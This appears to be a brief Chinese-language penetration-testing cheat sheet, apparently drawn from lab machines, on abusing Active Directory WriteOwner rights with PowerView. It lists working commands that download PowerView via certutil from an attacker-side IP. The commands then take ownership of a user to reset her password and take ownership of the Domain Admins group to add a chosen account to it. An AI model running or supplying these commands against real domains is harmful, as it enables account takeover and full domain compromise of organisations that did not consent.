# WriteOwner

1. 修改目标用户密码

```clike
	1. 连接上传
certutil -urlcache -split -f http://10.10.14.30/PowerView.ps1  
Import-Module .\PowerView.ps1 
	2. 设置acl
接下来，我将 tom 设置为 claire 的 ACL 的所有者： 
Set-DomainObjectOwner -identity claire -OwnerIdentity tom 
	3. 授权
接下来，我将授予 tom 更改该 ACL 上的密码的权限： 
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword 
	4. 修改密码
现在，我将创建一个凭证，然后设置克莱尔的密码： 
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force   
	5.启用密码
Set-DomainUserPassword -identity claire -accountpassword $SecPassword
```

1. 添加自己进组

```bash
upload PowerView.ps1
Import-Module .\PowerView.ps1

1。 设置为组所有者
Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'

2. 给自己授予全部权限
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights All

3. 把自己添加到Domain Admins
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'

退出重新进入
```
